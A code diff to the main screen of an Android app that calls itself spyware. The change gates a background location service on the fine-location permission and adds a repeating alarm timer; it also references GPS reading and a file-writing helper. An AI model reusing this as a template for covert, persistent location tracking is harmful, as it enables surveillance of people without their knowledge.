@@ -1,8 +1,10 @@
 package com.example.spyware
 
+import android.Manifest
 import android.app.AlertDialog
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
@@ -20,13 +22,16 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.tooling.preview.Preview
 import com.example.spyware.ui.theme.SpywareTheme
 import android.provider.Settings
+import androidx.core.app.ActivityCompat
 import appendShiftedToFile
+import com.example.spyware.common.Constants
 import log
 import org.json.JSONObject
 
 class MainActivity : ComponentActivity() {
     private var mobileDialogOpen=false
     private lateinit var gpsReader: GpsReader;
+    private lateinit var alarmManger:AlarmManger
 
     override fun onCreate(savedInstanceState: Bundle?) {
         println("Created MainActivity")
@@ -55,7 +60,7 @@ class MainActivity : ComponentActivity() {
 
 //        val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
 //        startActivity(intent)
-        if(!MainService.isServiceActive) {
+        if(!MainService.isServiceActive && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             this.startForegroundService(
                 Intent(
                     this,
@@ -63,6 +68,8 @@ class MainActivity : ComponentActivity() {
                 )
             );
         }
+        alarmManger= AlarmManger(this)
+        alarmManger.start(Constants.timerSeconds*1000)
     }
 
     override fun onResume() {
